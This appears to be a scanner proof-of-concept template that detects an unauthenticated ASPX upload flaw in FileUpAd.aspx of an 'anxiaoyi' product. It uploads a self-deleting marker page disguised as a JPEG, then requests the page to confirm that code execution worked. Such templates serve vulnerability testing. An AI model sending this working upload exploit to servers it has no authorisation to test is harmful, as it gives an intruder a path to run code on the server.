name: poc-yaml-anxiaoyi-FileUpAd.aspx-file-upload
transport: http
  

rules:
  r0:
    request:
      method: POST
      path: /Module/FileUpPage/FileUpAd.aspx?file_tmid=upload
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394

      body: "\
        ------21909179191068471382830692394\r\n\
        Content-Disposition: form-data; name=\"File\"; filename=\"test.aspx\"\r\n\
        Content-Type: image/jpeg\r\n\
        \r\n\
        <%@Page Language=\"C#\"%><%Response.Write(\"pboyjnnrfipmplsukdeczudsefxmywe\");System.IO.File.Delete(Request.PhysicalPath);%>\r\n\
        ------21909179191068471382830692394--\r\n\
        "
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /imgnews/imgad/000000/upload.aspx
    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
expression: r0() && r1()

